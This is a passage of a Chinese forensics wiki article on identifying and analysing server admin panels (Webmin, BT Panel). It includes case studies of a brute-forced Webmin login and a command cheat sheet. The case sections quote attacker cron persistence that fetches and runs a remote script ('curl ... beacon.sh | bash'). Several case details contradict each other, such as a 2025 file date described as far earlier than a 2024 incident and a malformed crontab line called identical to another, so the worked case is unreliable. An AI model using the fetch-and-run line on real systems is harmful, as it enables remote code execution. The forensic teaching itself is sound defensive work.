那个 IP 也许是跳板机、VPS、代理出口或共享 NAT。经过它的所有攻击，源地址都会显示成同一个。也可能是扫描器在批量扫段，对多台机器同时开打。还有一种可能是批量任务定时触发，跟同一个人手工操作没关系。

**影响**：**把无关的多台机器并成一个案件。**

攻击范围被高估，扩线方向也跟着跑偏——以为攻击者控制了某个 IP，实际那台只是被扫到的第三方主机。

**核查**：同源 IP 加时间接近，是「值得关联」的线索，不是「已确认为同一攻击者」的结论。

要真的关联起来，得拿出更有区分度的证据。工具指纹一致是个办法：同样的 UA、同样的路径顺序、同样的工具默认行为。手法一致也是：两台都是爆破，才像同一个人；一台爆破一台撞库，多半不是。

行为序列的对应关系同样能说明问题。先打 A 再打 B 的顺序，在同一批任务里保持一致，这才是串起来的证据。

案例里「同 IP + 相差 5 秒 + 不同面板不同手法」这个组合，**恰恰不支持简单合并**。报告里写成「同一攻击者针对不同面板分别尝试，且 `web01` 可能是口令复用而非爆破」，这个区分才是有价值的部分。

反过来说，案例中两台机器时间线吻合这一事实，报告里必须写出「不能排除跳板或批量扫描」的保留。

<a id="section-29"></a>

#### 陷阱 12：把「未安装面板」写成无边界的否定结论

**现象**：存在性普查全部未命中，报告写「该服务器未安装任何管理面板」，无任何限定。

**原因**：阴性结论被三重因素卡着。

一是路径没覆盖全部。本篇的对比表只列了常见面板，定制开发的面板根本没有通用路径，只看这张表就下结论必然漏。

二是「未安装」本身有三种成因：从未安装、装完即删、装在非标准路径（自定义安装目录、`/usr/local` 下的自研面板）。

三是端口与响应特征没查。离线镜像上这一项做不了，但在线时应该做。

**影响**：「未安装」被当成「没有面板类攻击面」，于是整条「Web 口令 = root」的攻击路径被排除掉——而这个排除，是基于一张不完整的清单。

**核查**：**三段式写法。**

第一段写检查范围：「在 `<N>` 个已知面板路径（已逐一列出）、对应 systemd unit、以及 8 个常见面板端口上检查，未发现管理面板的安装痕迹」。

第二段写未覆盖项：定制或自研面板（非标准安装路径）、已卸载并清理干净的面板、离线状态下无法验证的 HTTP 响应特征。

第三段给动作：建议向委托方索取运维交接记录与云厂商的镜像构建记录，确认安装历史。

**三种成因的可能性也要分开讲。**如果同期日志里出现过面板相关的报错路径或 UA 残留，比如 `/www/server/panel/logs/error.log` 出现在某处日志里，那「未安装」这个结论就是错的。

<a id="section-30"></a>

## 五、案例示例

<a id="section-31"></a>

### 5.1 运维否认与事实不符 面板普查与在用状态判定

**场景**

查获一台 Debian 12 云主机（编号 `web02`），委托方报告站点异常缓慢且流量暴涨。镜像 `DigiForensics.dd` 只读挂载到 `/mnt/df`。运维称「没装过任何面板」。任务：识别管理面板并查明使用记录。

这条路径之所以值得先走，是因为「运维说没装」是一句需要被证据检验的话，不是前提。管理面板是全机权限的入口，一旦存在且被使用，它对案件定性的影响远大于任何单个 Web 进程。把它当作待证事项而不是既定事实，是这一节的核心方法。

**处置过程**

**第 1 步 · 面板存在性普查与在用状态判定**

```bash
for d in /www/server/panel /opt/1panel /etc/webmin /etc/usermin \
         /usr/local/cpanel /usr/local/directadmin /usr/local/psa \
         /etc/cockpit; do
  [ -d "/mnt/df$d" ] && echo "命中  $d"
done
# 命中  /etc/webmin
# 命中  /usr/share/webmin          ← 运维称"没装过任何面板"，与事实不符

ls -l --time-style=long-iso /mnt/df/etc/webmin/miniserv.conf
# -rw-r----- 1 root root 3412 2024-02-10 09:22 /mnt/df/etc/webmin/miniserv.conf
ls /mnt/df/var/log/webmin/ 2>/dev/null
# auth.log  miniserv.log              ← 注意：没有 webmin.log
tail -2 /mnt/df/var/log/webmin/miniserv.log
# 198.51.100.24 - - [18/Mar/2024:02:14:33] "GET /session/login.cgi HTTP/1.1" 200
```

**判定：Webmin 在用**（配置 + 程序 + 近期服务日志三者齐备），且**操作日志未开启**。

**这三个要素缺一不可。**`/etc/webmin/` 和 `/usr/share/webmin/` 同时存在，只说明**装过**——`miniserv.conf` 在卸载后可能残留。真正能说明「在用」的，是 `miniserv.log` 里**采集时刻前 8 分钟**的请求。

**第 2 步 · 读主配置**

```bash
grep -E '^(port|listen|ssl|allow|deny|logfile)' /mnt/df/etc/webmin/miniserv.conf
# port=10000
# listen=0.0.0.0          ← 监听所有网卡
# ssl=1
# allow=                  ← 空！未设置任何 IP 限制
```

**关键发现**：`allow=` 为空意味着任何能连到 10000 端口的人都可以尝试登录 Webmin，而 Webmin 登录后默认就是 root 权限。这是本机最大的暴露面。

**第 3 步 · 认证日志分析**

```bash
awk '{print $1}' /mnt/df/var/log/webmin/auth.log | sort | uniq -c | sort -rn | head
#  12043 127.0.0.1            ← 本地/自动化，健康
#    312 203.0.113.10         ← 管理员常用 IP
#     47 198.51.100.24        ← ★ 陌生 IP，失败尝试 47 次

grep '198.51.100.24' /mnt/df/var/log/webmin/auth.log | head -6
# 198.51.100.24 login failed 2024-03-17 22:30:11
# 198.51.100.24 login failed 2024-03-17 22:30:14
# 198.51.100.24 login failed 2024-03-17 22:30:19
# ... 47 次失败后：
# 198.51.100.24 login successful 2024-03-17 22:41:02
```

**这是一次成功的暴力破解**——47 次失败后成功。**时间 22:41:02**，与 `web01`（宝塔环境）被攻破的时间 `22:41:07` 相差 5 秒。

不过「47 次失败」这个数字还先放着，看完时间分布再定性。

**第 4 步 · 读用户库**

```bash
perldump /mnt/df/etc/webmin/users.pl 2>/dev/null | head -30
# 'root' => {
#   'password' => '$1$...',        ← 口令哈希（不是明文）
#   'utmp' => 'root',
#   'webminlog' => 1,
#   ...  # }
```

用户库中只有 `root` 一个账户，**没有攻击者新建的 Webmin 账户**。

这说明攻击者没有创建新账户，而是破解了 root 口令直接登录。

严格说只能讲到这一步，「创建后删除」排除不掉。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 该机安装了 Webmin 且**正在使用** | 配置 + 程序 + 近期服务日志 | 强（**三者齐备**） |
| 运维「没装过任何面板」的说法与事实不符 | 目录普查命中两处 | 强（**基础信息核实错误，须记录**） |
| Webmin 未设置访问 IP 限制 | `miniserv.conf` 中 `allow=` 为空 | 强（配置原文） |
| Webmin 监听 `0.0.0.0:10000` 且启用 SSL | `listen` / `port` / `ssl` 字段 | 强 |
| **面板操作未被完整记录** | `webmin.log` 不存在（`webminlog=1` 但文件无） | 强（文件不存在） |
| 攻击者未创建新账户 | `users.pl` 中仅 root | 中（**无法排除已删账户**） |

**误判对照**

这个案例最容易出的错是**顺着运维的说法往下走**——运维通常就是现场对接人，其陈述容易被当作既定前提。

1. **运维的陈述是待验证的材料，不是排除性证据。**判别「面板是否在用」要三个独立证据同时成立：**程序目录**（`/usr/share/webmin/`）+ **配置文件**（`miniserv.conf` 的 mtime）+ **服务日志**（`miniserv.log` 里的近期请求）。只有前两者说明「装过」，必须要有第三项才说明「在用」。本案三者齐备，所以运维的说法被证据否定，记录为「基础信息核实错误」。这个记录本身对委托方有价值：它说明交接流程或资产管理存在缺口。
2. **「目录存在」与「服务在跑」是两件事。**`/etc/webmin/` 在卸载后经常残留，尤其在手动删除 RPM 之后。唯一能证明「正在提供服务」的判据是 `miniserv.log` 中有近期请求——这里要注意**排除轮转残留**：`miniserv.log.1` 里的旧记录不代表当前在跑。本案用的是**未轮转的 `miniserv.log`**，时间戳距采集时刻仅 8 分钟。
3. `webminlog=1` 与 `webmin.log` 存在是两件事。`users.pl` 里 `webminlog => 1` 只表示配置意图，实际是否产生日志文件取决于 Webmin 版本、模块加载与磁盘状态。判据是文件是否存在。本案文件不存在，说明操作审计**在这个系统上不可用**，这是一个必须在报告里写明的取证缺口，而不是「日志里没查到」。
4. `users.pl` 只有 root，不等于攻击者没建过账户。攻击者完全可以在登录后创建账户、再在离开前删除。判别「是否曾创建后删除」需要 (a) `users.pl` 的 inode 变更时间与 mtime 的差异、(b) `auth.log` 中是否有对应账户的登录记录、(c) 文件系统层面的未分配空间残留——**这三项本案均未查**。正确表述是「当前用户库中仅有 root，未发现新增账户痕迹」，而非「攻击者没有创建账户」。

**按错误判据走的代价**：第 1 条踩中代价最大。整台机器会被**按「无面板」环境来清理**，Webmin 本身留在原地——包括它的口令、它的 root 权限映射。清理完，攻击者仍可用同一组口令重新进入。

而本案恰恰是 47 次爆破成功，**说明 root 口令已经被拿到了**。把一个已被爆破成功的 root 口令留在机器上，等于把 5.1 里那个 cron 持久化（`*/5 * * * * curl ... | bash`）的通道永久保留。

第 3 条踩中则会让报告的证据链看起来完整，而实际上**面板操作层完全空白**。这个缺口不写明，委托方会以为后续结论都有面板日志支撑。

<a id="section-32"></a>

### 5.2 登录成功到 cron 持久化的行为序列重建

**场景**

承接 5.1。`webmin.log` 未开启，**面板操作层没有审计**。委托方的问题是：「既然操作日志没开，你们凭什么说他在 22:42 改了 `/etc/crontab`？」

这是一个必须正面回答的质疑。答案不在日志里，而在「请求 URL 的语义」与「文件系统的结果」这两类证据的交叉上。

**处置过程**

第 1 步 · 从 `miniserv.log` 提取登录后的完整请求序列

```bash
# 关键：miniserv.log 记录 URL 与状态码，虽不记具体改了什么，但 cgi 路径本身有语义
grep -E 'session|file|cron|shell' /mnt/df/var/log/webmin/miniserv.log | tail -30
```

```
2024-03-17 22:41:20 "GET /proc/index_tree.cgi HTTP/1.1" 200
2024-03-17 22:41:35 "GET /file/show.cgi?/etc/crontab HTTP/1.1" 200
2024-03-17 22:42:01 "GET /file/edit.cgi?/etc/crontab HTTP/1.1" 200
2024-03-17 22:42:10 "GET /shell/index.cgi HTTP/1.1" 200
```

**这四个 cgi 路径构成一条完整的行为链**，且顺序有意义：

| 时刻 | 请求 | 语义 | 判别依据 |
|---|---|---|---|
| 22:41:20 | `/proc/index_tree.cgi` | 打开进程列表 | Webmin 的进程管理模块入口 |
| 22:41:35 | `/file/show.cgi?/etc/crontab` | **以只读方式打开** `/etc/crontab` | **URL 参数直接携带了目标路径** |
| 22:42:01 | `/file/edit.cgi?/etc/crontab` | **进入编辑模式** | 同上，`show` → `edit` 是编辑流程的两步 |
| 22:42:10 | `/shell/index.cgi` | 打开 Web Shell 终端 | 独立的功能入口 |

注意 `file/show.cgi?` 与 `file/edit.cgi?` 的 URL 参数里直接写着 `/etc/crontab`。

这是 Webmin 特有的设计：文件操作的目标路径放在 query string 里。虽然它不记录「改成了什么」，但**它明确记录了「打开了哪个文件的编辑器」**。这个信息在别家面板里往往是没有的。

第 2 步 · 与文件系统的结果交叉验证（先分清两个易混文件）

Debian 12 上有两处 cron 配置，**本案两条路径都要查**：

```bash
# A. 系统级 crontab（有自己的 SHELL=/PATH 头，条目带 user 字段）
cat /mnt/df/etc/crontab
# # /etc/crontab: system-wide crontab
# SHELL=/bin/sh
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# 17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
# ★ /usr/local/sbin  /bin/sh -c 'curl -s http://198.51.100.24/beacon.sh | bash'   ★ 新增
stat -c '%n mtime=%y' /mnt/df/etc/crontab
# mtime=2024-03-17 22:42:05     ← 与 Webmin 编辑请求 22:42:01 吻合

# B. root 的个人 crontab（无 SHELL/PATH 头，条目不带 user 字段）
cat /mnt/df/var/spool/cron/crontabs/root
# 17 *	* * *	cd / && run-parts --report /etc/cron.hourly
# 25 6	* * *	/usr/local/bin/backup-db.sh
# ← 两条均为原有业务任务，未被改动
stat -c '%n mtime=%y' /mnt/df/var/spool/cron/crontabs/root
# mtime=2025-12-18 09:14:22   ← ★ 远早于本案，未被触碰
```

**双源印证成立。**请求侧说「22:42:01 打开了 `/etc/crontab` 的编辑器」，结果侧说「`/etc/crontab` 在 22:42:05 被修改」。两个独立来源、时间相差 4 秒、指向同一个文件路径。

这一步同时排除了一种常见误读：只查 `crontabs/root` 而不查 `/etc/crontab`，会得出「该 IP 的 cron 持久化没找到」的错误阴性结论——因为持久化在系统级 crontab 里，而不在 root 的个人 crontab 里。本案两处都查，才能既确认 `/etc/crontab` 被改、又确认个人 crontab 干净。


第 3 步 · 补一条：cron 条目本身与 `web01` 的对照

`web01`（宝塔）上发现的是**面板数据库里的计划任务**（[第 02 篇](server-panel-bt-panel-forensics.md)），`web02` 上发现的是**系统 crontab**。两者内容形态一致——

```bash
# web02 的 crontab
# */5 * * * * curl -s http://198.51.100.24/beacon.sh | bash
# web01 的面板 crontab 表 sContent
# curl -s http://198.51.100.24/beacon.sh | bash
```

同一 URL、同一周期、同一命令形态，落在两台机器的两种不同载体上，指向的是工具层面的同源，而非单纯的同 IP。

第 4 步 · 那个 `/shell/index.cgi` 之后发生了什么（本案不可得）

```bash
# Webmin 的 shell 模块会自己记日志吗？——不记
ls -l /mnt/df/var/log/webmin/
# auth.log  miniserv.log          ← 没有别的
```

**Web Shell 里执行的命令完全没有记录。** 这是本案的取证边界：22:42:10 之后的操作，只有文件系统上的结果能反映。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 22:41:20–22:42:10 存在**四步连续的面板操作** | `miniserv.log` 的 cgi 路径序列 | 强（**URL 语义层，非操作日志**） |
| 22:42:01 打开了 `/etc/crontab` 的编辑器 | `file/edit.cgi?/etc/crontab` **URL 参数直含路径** | 强（**Webmin 特有，判别力高**） |
| `/etc/crontab` 于 22:42:05 被修改 | crontab mtime | 强 |
| 「编辑 crontab」与「crontab 被改」是同一行为 | 请求 22:42:01 + mtime 22:42:05 | **强（双源，差 4 秒）** |
| 22:42:10 打开了 Web Shell 终端 | `/shell/index.cgi` | 强（**打开了，不等于执行了什么**） |
| **Web Shell 内执行了什么** | 无日志 | **不可得（取证缺口）** |
| 该 cron 条目与 `web01` 同源 | 两机同一 URL/周期/命令，载体不同 | 强（**形态一致性 + 见 5.3**） |

**取证缺口的正确表述**：报告里**不能**写「22:42:10 起攻击者通过 Web Shell 建立了回连」。

正确表述是「22:42:10 有 Web Shell 会话被打开；该会话内的命令执行未记录，宿主机上可观察到的是 22:42:05 的 crontab 修改」。

这两句话的差别，就是「知道」与「以为知道」的差别。

**误判对照**

这个案例最容易出的错有两个，第二个是这类场景的经典陷阱。

1. **把 `miniserv.log` 当操作日志。**它记的是**HTTP 访问**（URL + 状态码），不是**管理操作**（改了什么文件、执行了什么命令、删了什么东西）。差别在字段：`miniserv.log` 里写着 `GET /file/edit.cgi?/etc/crontab 200`，**但没有任何字段记录这次编辑是否真的保存了内容**——理论上打开编辑器后直接关闭也会留下这条记录。所以这条请求证明的是「到达了编辑页面」，不是「保存了修改」。必须靠 crontab 的 mtime 来补上「保存」这一环。只写 `miniserv.log` 就宣布「攻击者编辑了 crontab」，中间缺一环。
2. **把 Web Shell 打开当成命令执行。**`/shell/index.cgi 200` 只说明**终端界面被加载了**。攻击者可能开了就没用，也可能用了 5 分钟敲了一堆命令。判别命令执行只能靠文件系统结果、进程痕迹或网络连接。

   本案三者中前两者在 22:42 之后均无相关痕迹。`crontab` 的修改发生在 `shell/index.cgi` **之前** 9 秒，属于文件管理器而非 Shell 的产物。这个时间顺序本身很重要：它说明 crontab 的修改不是通过 Web Shell 做的，而是通过 `file/edit.cgi` 做的。
3. `/etc/crontab` 与 `/var/spool/cron/crontabs/root` 不是同一个文件，两者必须分别固定。Debian 12 上，前者是系统级 crontab（有 `SHELL=` / `PATH=` 头，条目格式为 `user command`），后者是 root 的个人 crontab（**无头，条目不带 user 字段**）。**两者的 `mtime` 会给出完全相反的答案**——本案 `/etc/crontab` 的 mtime 是 22:42:05（被改），`crontabs/root` 是 2025-12-18（干净）。

   **只查其中一处，结论会直接反向**：只查 `crontabs/root` 会漏掉真正的持久化；只查 `/etc/crontab` 则无法证明「个人 crontab 未被改动」。判别方法：`head -10 /etc/crontab` 看是否含 `SHELL=` / `PATH=` 头，据此确认读的是哪一个。

**按错误判据走的代价**：第 1、2 条踩中，报告会把「到达过编辑页面」和「打开过终端」两件事，写成「攻击者修改了 crontab 并通过 Shell 建立了回连」。

这两条推断在技术上都**超出证据**，而它们恰恰是委托方最关心、也最可能写进整改报告的句子。一旦后续发现 `/etc/crontab` 其实没被改、而攻击者用的是另一个持久化位置，整条「已闭环」的攻击链就会断裂，交付方需要为这份看起来完整的报告负责。

第 3 条踩中则会**漏掉一个持久化点**——这是最不可接受的一类漏检。

<a id="section-33"></a>

### 5.3 跨机交叉 47 次失败与 2 次成功的对照

**场景**

承接 5.1 与 5.2。`web01`（宝塔）与 `web02`（Webmin）都被同一个 IP 在同一分钟攻破。委托方的问题很直接：「既然是同一个人，为什么两台机器的登录过程差这么多？」

这个差异是本案**最有价值的发现之一**。它区分了两种完全不同的初始访问方式，而这两种方式指向的整改动作不一样。

**处置过程**

**第 1 步 · 把两台机器的登录过程并排列出来**

| 事实 | `web01`（宝塔） | `web02`（Webmin） |
|---|---|---|
| 攻击 IP | 198.51.100.24 | 198.51.100.24 |
| 突破时刻 | 22:41:07（宝塔登录） | 22:41:02（Webmin 登录成功） |
| 手段 | 宝塔账号被盗/爆破 | root 口令暴力破解（47 次失败） |
| 失败次数 | 2 次提交即成功 | 47 次失败后成功 |
| 首个失败时间 | 22:40:58 | 22:30:11 |
| 首次尝试时间 | 22:40:58 | 22:30:11 |

**第 2 步 · 时间差 5 秒意味着什么**

`web02` 的爆破在 **22:30:11** 就开始了，**11 分钟后才成功**。而 `web01` 的两次尝试集中在 **22:40:58–22:41:07**，**9 秒内完成**。

这个时间结构指向一个解释：攻击者先攻 `web02`（难，耗时 11 分钟），拿到 root 口令线索或横向能力后，再用已知凭据**快速攻下 `web01`（易，9 秒）**。

但这只是**一个假设**，见误判对照。

第 3 步 · 一个更有判别力的旁证：两机的持久化是同一形态

```bash
# web01（宝塔面板数据库 crontab 表）
# curl -s http://198.51.100.24/beacon.sh | bash        ← 面板任务

# web02（系统级 /etc/crontab）
# /usr/local/sbin  /bin/sh -c 'curl -s http://198.51.100.24/beacon.sh | bash'   ← 系统任务
```

**同一 URL、同一周期、同一命令。**

这支持的不只是「同一攻击者」，而是**同一套自动化工具或脚本**——手工操作要在两台机器上打出一字不差的 cron 条目并不现实。

这条证据的强度**高于「同 IP + 时间接近」**，因为它指向的是**工具层面的同一性**。

第 4 步 · 反向验证：是否可能是两个不同的攻击者

```bash
# 检查 web01 上该条目的创建时间
sqlite3 "file:/evidence/bt-data/db/panel.db?mode=ro" \
  "SELECT id, type, sContent FROM crontab WHERE sContent LIKE '%beacon.sh%';"
# id=8  minute  curl -s http://198.51.100.24/beacon.sh | bash

# panel.db 该记录的物理变更时间（inode 级）
stat -c '%n mtime=%y ctime=%z' /evidence/bt-data/db/panel.db
# mtime=2024-03-18 02:05:41  ctime=2024-03-18 02:05:41
```

**两个可疑点。**

(a) `panel.db` 的 mtime 是 **03-18 02:05**，而 cron 条目按 `web01` 的时间线应在 **03-17 22:48 之后**创建。这意味着该数据库在 03-18 02:05 又被写过，可能是攻击者后续修改，也可能是面板自身的正常写入——它有大量内部状态更新。

(b) 因此无法用 `panel.db` 的 mtime 来确定该 cron 条目的创建时刻。**这一点必须写进报告**，不能拿 mtime 当创建时间。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 两机为同一攻击者 | 同 IP + 时间差 5 秒 + **cron 条目一字不差** | 强（**工具同源性比 IP 更硬**） |
| `web02` 的初始访问为**暴力破解** | 47 次 `login failed` 后 `login successful` | 强（认证日志自证） |
| `web01` 的初始访问**更可能是凭据已知** | 9 秒内 2 次即成功，此前无失败记录 | 中（**非确证，见误判对照**） |
| `web01` 的面板口令与 `web02` 的 root 口令**可能存在复用关系** | 两机同 IP、同分钟突破 | **未决项（本案无证据）** |
| `panel.db` 的 mtime **不能**用于确定 cron 条目创建时间 | mtime 03-18 02:05 晚于预期创建时刻 | 强（**否定性判据**） |
| 攻击者使用的自动化工具在两机留下了同形态产物 | cron 条目内容完全一致 | **强（本案最硬的跨机证据）** |

**限定范围**：「`web01` 的 `panel.db` 的 `crontab` 表 + `web02` 的 `/var/spool/cron/crontabs/root` + 两机的 `auth.log`/`request.log`」。
**未查**：`web01` 与 `web02` 的 `users`/`users.pl` 中是否存在相同的口令哈希（**这是验证「口令复用」假设的唯一直接手段**，本案未做，且需按[第 03 篇](server-panel-bt-panel-encrypted-data.md)的授权与脱敏要求处理）；**未查** `beacon.sh` 的内容（需被动解析，不得执行）；**未查** `198.51.100.24` 之外是否还有其他来源 IP 参与了本次行动（**两机的日志都只覆盖到本机视角**）。

**误判对照**

这个案例最容易出的错是**过度归并**。看到同 IP 就把两台机器、所有现象合成一条「完整攻击链」，而这条链里有几环其实没有证据。

1. **「同 IP」不等于「同一主体」。**判别力来自**工具同源性**：两机 cron 条目一字不差（同一 URL、同一周期、同一命令），这是自动化工具留下的指纹，判别力显著高于 IP 与时间。但即便如此，「同一工具」仍不能排除「**两个不同的人使用了同一套现成工具包**」——这类工具在攻防两端都有流通。**若要归并到具体主体，需要网络侧或第三方证据**，比如该 IP 的注册与使用记录。
2. **「9 秒内 2 次成功」不等于「口令已知」。**判别「爆破」与「凭据复用」的关键是**更早的失败记录**。若该 IP 在 `web01` 的日志留存期内（`request.log` 共 10 份，最早 03-09）**完全无记录**，则本次是该 IP 首次出现即成功，**指向凭据已知**。

   但这里有一个必须承认的缺口：留存期只有 9 天，9 天之前是否有针对 `web01` 的爆破，本案不可知。因此结论只能写「在日志留存范围内，该 IP 首次出现即登录成功，未见爆破痕迹」，强度为**中**，不能写「确定是口令复用」。
3. **数据库文件的 mtime 会被无关写入刷新。**`panel.db` 在 03-18 02:05 的 mtime **不能**用来证明「cron 条目在 02:05 创建」——面板自身也在持续更新这张表（会话状态、上次登录时间等）。要确定单条记录的创建时间，需要的是该记录所在表的变化历史或 binlog，而 SQLite 没有。

   `stat` 只能回答「这个文件最后什么时候被写过」，**不能回答「这条记录什么时候被写的」**——**这是两个不同的问题。**
4. **跨机归并不能跨越证据缺口。**本案两机的**系统层证据**（cron 条目）能互证，**但面板层证据不能**：`web01` 有 `request.log` 而 `web02` 没有操作日志；`web02` 有 `auth.log` 完整记录 47 次失败，而 `web01` 的登录记录里看不出失败特征。

   两份证据的「分辨率」不同，强行对齐会制造出两边都没有的细节。

**按错误判据走的代价**：第 2 条踩中，报告会写「攻击者在 `web01` 上没有进行爆破，说明口令早已泄露」。

方向大概率没错，但**强度被高估了**。委托方据此去找「口令从哪里泄露的」，而真相可能是「9 天前有过爆破，只因日志轮转没保留」。**双方会围绕一个不存在的事实争论很久。**

第 4 条踩中则会让报告虚构出一条比实际更完整的攻击链，**包括一些实际上没有证据的中间步骤。**这类补全在事后复核时很容易被发现，一旦被指出，整份报告的其余部分都会被要求重新验证。

<a id="section-34"></a>

## 六、扩展阅读方向

本篇解决的是「认出这是什么面板」。认出之后要做什么、怎么和站点侧与容器侧衔接、结论能写多强，下面几组文章分别接住。

**同一个面板：认出来之后**

- [宝塔面板取证](server-panel-bt-panel-forensics.md) —— **本篇最常对照的对象**。取证路径明确，值得单独处理：`users` 表、`request.log`、`action.log`、7.x/8.x 架构差异。
- [宝塔新版加密数据解密](server-panel-bt-panel-encrypted-data.md) —— 新版架构的密文处理。其他面板若发现类似封装（值的外观 + 密钥材料另存），判据可以借用，但机制不可套用。

**容器化面板：宿主机之外那一层**

- [Docker 取证工件地图](../server-docker/server-docker-docker-artifact-map.md) —— **1Panel 的日志与数据可能全在容器里**。这份地图是宿主机与容器两层分界的基础。
- [Volume 与绑定挂载取证](../server-docker/server-docker-docker-volumes-and-bind-mounts.md) —— 面板容器的命名卷在哪、删了容器数据还在不在。
- [镜像层与 overlay2 解析](../server-docker/server-docker-overlay2.md) —— 面板容器用的镜像里有什么、构建指令是不是官方版本。

**面板配置指向的站点与站点上的东西**

- [Nginx 与 Apache 配置取证](../server-web/server-web-nginx-apache.md) —— 面板生成的站点配置怎么读、日志路径在哪。
- [网站目录与 WebShell 检测](../server-web/server-web-webshell-detection.md) —— 面板的文件管理上传过什么。
- [WebShell 工具流量特征](../server-web/server-web-webshell-traffic-patterns.md) —— 内容可疑但不确定时的定性手段。

**跨机关联与结论**

- [取证工件地图（Linux 侧）](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) —— 面板之外的痕迹：账户、计划任务、SSH 密钥。**面板能做的这些事在系统侧同样留痕，两边要对照。**
- [Linux 系统日志深度分析](../../computer/computer-log/computer-log-system-log-analysis.md) —— **面板访问与 SSH 访问的时间线能否拼成一条**，是归因的关键。
- [取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md) —— 面板凭据按密级材料管理的依据。
- [合规授权与法律边界](../../fundamentals/fundamentals-practice/fundamentals-practice-legal-authorization-and-boundaries.md) —— 商业面板在境外部署场景下的调取边界。
<a id="section-35"></a>

## 七、命令速查

```bash
# ===== 1. 面板存在性普查（先跑这个）=====
for d in /www/server/panel /opt/1panel /etc/webmin /etc/usermin \
         /usr/local/cpanel /usr/local/directadmin /usr/local/psa \
         /etc/cockpit /opt/cockpit; do
  [ -d "/mnt/df$d" ] && echo "命中  $d"
done
ls /mnt/df/etc/systemd/system/ 2>/dev/null | grep -iE 'panel|webmin|1panel|cockpit'
ss -tulpn | grep LISTEN

# ===== 2. 判定"装过"还是"在用" =====
ls -l --time-style=long-iso /mnt/df/etc/webmin/miniserv.conf 2>/dev/null
ls -l --time-style=long-iso /mnt/df/opt/1panel/db/1Panel.db 2>/dev/null
tail -3 /mnt/df/var/log/webmin/miniserv.log 2>/dev/null
ls /mnt/df/www/server/panel/class/ 2>/dev/null | head

# ===== 3. 1Panel =====
cp -rp /mnt/df/opt/1panel /evidence/1panel/
sqlite3 "file:/evidence/1panel/db/1Panel.db?mode=ro" ".tables"
sqlite3 -header -column "file:/evidence/1panel/db/1Panel.db?mode=ro" "SELECT * FROM users;" 2>/dev/null
docker ps -a --format 'table {{.Names}}\	{{.Image}}' 2>/dev/null    # 容器层
docker logs 1panel 2>&1 | tail -50                                  # 日志可能在 stdout
ls -l /mnt/df/var/lib/docker/volumes/ 2>/dev/null                      # 命名卷

# ===== 4. Webmin（Perl 配置，不能直接 cat）=====
cp -rp /mnt/df/etc/webmin /evidence/webmin-etc/
grep -E '^(port|listen|ssl|allow|deny|logfile)' /mnt/df/etc/webmin/miniserv.conf
sudo apt install perl-Data-Dump                 # 提供 perldump 命令
perldump /mnt/df/etc/webmin/users.pl 2>/dev/null | head -40
# 没装 perl-Data-Dump 时用核心模块（无需额外安装）
perl -MData::Dumper -e 'do "/mnt/df/etc/webmin/users.pl"; print Dumper($users);' 2>/dev/null | head -40
ls -l /mnt/df/etc/webmin/ssl/ 2>/dev/null         # 证书与私钥（高价值）
ls -l /mnt/df/var/log/webmin/ 2>/dev/null         # webmin.log 默认不开
awk '{print $1}' /mnt/df/var/log/webmin/auth.log | sort | uniq -c | sort -rn | head
grep -E 'login (failed|successful)' /mnt/df/var/log/webmin/auth.log | head -20

# ===== 5. 通用识别（未知面板）=====
for p in 8888 10086 10000 20000 9090 2222 2083 8443; do
  echo "== $p"; curl -skI --max-time 3 "https://127.0.0.1:$p" 2>/dev/null | head -5
done
grep -rlE ':8888|:10086|:10000' /mnt/df/etc/ /mnt/df/www/ 2>/dev/null | head -20
grep -rlE 'panel|webmin|1panel' /mnt/df/var/log/*.log 2>/dev/null | head

# ===== 6. 站点资产汇总 =====
ls -d /mnt/df/www/wwwroot/*/ /mnt/df/var/www/*/ 2>/dev/null
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 服务器与 Web 取证 — 其他管理面板取证」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《其他管理面板取证》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics.vc` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
